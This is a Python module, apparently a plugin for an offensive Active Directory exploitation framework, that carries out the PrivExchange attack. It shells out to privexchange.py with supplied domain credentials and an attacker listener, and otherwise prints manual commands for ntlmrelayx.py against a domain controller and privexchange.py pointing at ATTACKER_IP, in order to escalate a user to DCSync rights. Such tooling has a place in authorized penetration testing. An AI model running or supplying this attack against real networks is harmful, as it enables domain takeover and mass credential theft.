"""PrivExchange — Exchange NTLM relay → DCSync rights."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.exchange.privexchange.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_relay", "privilege_escalation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1557.001"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    listener = getattr(args, "listener", None) if hasattr(args, "listener") else None

    print("[*] PrivExchange: Exchange → DCSync escalation")
    print("[*] Exchange: {}  Listener: {}".format(target, listener or "ATTACKER"))

    import subprocess, shutil
    privexchange = shutil.which("privexchange.py") or shutil.which("privexchange")
    if privexchange:
        cmd = [privexchange, "-ah", listener or "", target or "",
               "-u", cred.username or "", "-p", cred.password or "",
               "-d", cred.domain]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[*] Manual PrivExchange:")
    print("  1. ntlmrelayx.py -t ldap://DC --escalate-user {}".format(cred.username or "USER"))
    print("  2. privexchange.py -ah ATTACKER_IP {} -u {} -d {}".format(
        target or "EXCHANGE", cred.username or "USER", cred.domain))
    return 0
